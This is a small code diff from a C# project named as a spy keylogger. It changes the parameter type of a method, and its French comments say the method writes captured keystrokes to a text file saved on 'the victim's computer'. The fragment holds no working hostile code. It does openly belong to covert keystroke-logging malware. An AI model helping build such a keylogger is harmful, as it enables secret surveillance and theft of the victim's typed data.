@@ -53,7 +53,7 @@ namespace ProjetEspionKeyLogger
 
 
         //Méthode qui écrit la saisie dans un .txt
-        private void enregistreTxt(texte)
+        private void enregistreTxt(int texte)
         {
 
             //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
